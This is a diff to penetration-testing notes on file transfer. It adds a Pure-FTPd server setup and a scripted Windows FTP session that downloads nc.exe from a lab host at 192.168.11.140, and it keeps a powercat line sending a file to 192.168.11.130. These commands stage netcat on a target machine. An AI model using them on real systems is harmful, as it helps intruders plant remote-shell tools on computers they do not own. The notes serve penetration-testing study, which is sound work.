@@ -1,5 +1,5 @@
 # File Transfer
-`477`
+
 ## HTTP Server
 
 Server
@@ -36,7 +36,7 @@ $ locate whoami.exe
 $ smbserver.py a /usr/share/windows-binaries/
 ```
 
-SMB Server
+SMB Client
 
 ``` bash
 $ \\<ip_server>\a\whoami.exe
@@ -57,6 +57,37 @@ Anonymous access
 sudo nano /etc/vsftpd.conf
 
 => anonymous_enable=YES
+```
+
+## Pure-FTPd
+
+setup-ftp.sh
+
+``` bash
+groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pw useradd hades -u ftpuser -d /ftphome
+pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+ln -s ../conf/PureDB 60pdb
+mkdir -p /ftphome
+chown -R ftpuser:ftpgroup /ftphome/
+systemctl restart pure-ftpd
+```
+
+ftp.txt
+
+``` bash
+open 192.168.11.140 21
+USER hades
+passwd
+bin
+GET nc.exe
+quit
+```
+
+``` bash
+ftp -v -n -s:ftp.txt
 ```
 
 ## Netcat
@@ -122,3 +153,5 @@ Windows machine
 ``` bash
 powercat -c 192.168.11.130 -p 443 -i C:\Users\Public\powercat.ps1
 ```
+
+`483`
